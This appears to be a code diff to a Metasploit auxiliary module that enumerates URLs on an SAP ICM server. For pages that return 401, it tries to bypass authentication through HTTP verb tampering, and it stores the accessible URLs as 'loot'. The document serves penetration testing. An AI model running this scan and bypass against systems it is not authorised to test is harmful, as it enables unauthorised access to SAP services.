@@ -40,7 +40,6 @@ class Metasploit3 < Msf::Auxiliary
       {
         'uri'       => "/" + Rex::Text.rand_text_alpha(12),
         'method'    => 'GET',
-        'ctype'     => 'text/plain',
       })
 
     if res
@@ -66,7 +65,7 @@ class Metasploit3 < Msf::Auxiliary
       end
 
       print_status("#{rhost}:#{rport} Beginning URL check")
-      @valid_urls = []
+      @valid_urls = ''
       urls_to_check.each do |url|
         check_url(url.strip)
       end
@@ -74,14 +73,24 @@ class Metasploit3 < Msf::Auxiliary
       print_error("#{rhost}:#{rport} No response received")
     end
 
+    if @valid_urls.length > 0
+      l = store_loot(
+        'sap.icm.urls',
+        "text/plain",
+        datastore['RHOST'],
+        @valid_urls,
+        "icm_urls.txt", "SAP ICM Urls"
+      )
+      print_line
+      print_good("Stored urls as loot: #{l}") if l
+    end
   end
 
   def check_url(url)
     full_url = write_url(url)
     res = send_request_cgi({
-      'uri'       => url,
+      'uri'       => normalize_uri(url),
       'method'    => 'GET',
-      'ctype'     => 'text/plain',
     })
 
     if (res)
@@ -92,25 +101,25 @@ class Metasploit3 < Msf::Auxiliary
 
       case res.code
       when 200
-        print_good("#{full_url} - does not require authentication (200)")
-        @valid_urls << full_url
+        print_good("#{full_url} - does not require authentication (#{res.code})")
+        @valid_urls << full_url << "\n"
       when 403
-        print_good("#{full_url} - restricted (403)")
+        print_status("#{full_url} - restricted (#{res.code})")
       when 401
-        print_good("#{full_url} - requires authentication (401): #{res.headers['WWW-Authenticate']}")
+        print_status("#{full_url} - requires authentication (#{res.code}): #{res.headers['WWW-Authenticate']}")
         # Attempt verb tampering bypass
         bypass_auth(url)
       when 404
         # Do not return by default, only display in verbose mode
-        vprint_status("#{full_url} - not found (404)")
-      when 500
-        print_good("#{full_url} - produced a server error (500)")
-      when 301, 302
-        print_good("#{full_url} - redirected (#{res.code}) to #{res.headers['Location']} (not following)")
-        @valid_urls << full_url
+        vprint_status("#{full_url} - not found (#{res.code})")
+      when 400,500
+        print_status("#{full_url} - produced a server error (#{res.code})")
+      when 301, 302, 307
+        print_good("#{full_url} - redirected (#{res.code}) to #{res.redirection} (not following)")
+        @valid_urls << full_url << "\n"
       else
-        print_status("#{full_url} - unhandle response code #{res.code}")
-        @valid_urls << full_url
+        print_error("#{full_url} - unhandled response code #{res.code}")
+        @valid_urls << full_url << "\n"
       end
 
     else
@@ -125,24 +134,24 @@ class Metasploit3 < Msf::Auxiliary
       protocol = 'http://'
     end
 
-    "#{protocol}#{rhost}:#{rport}/#{path}"
+    "#{protocol}#{rhost}:#{rport}#{path}"
   end
 
   def bypass_auth(url)
     full_url = write_url(url)
-    print_status("#{full_url} Check for verb tampering (#{datastore['VERB']})")
+    vprint_status("#{full_url} Check for verb tampering (#{datastore['VERB']})")
 
     res = send_request_raw({
-      'uri'       => url,
+      'uri'       => normalize_uri(url),
       'method'    => datastore['VERB'],
       'version'   => '1.0' # 1.1 makes the head request wait on timeout for some reason
     })
 
     if (res and res.code == 200)
       print_good("#{full_url} Got authentication bypass via HTTP verb tampering")
-      @valid_urls << full_url
+      @valid_urls << full_url << "\n"
     else
-      print_status("#{full_url} Could not get authentication bypass via HTTP verb tampering")
+      vprint_status("#{full_url} Could not get authentication bypass via HTTP verb tampering")
     end
   end
 end
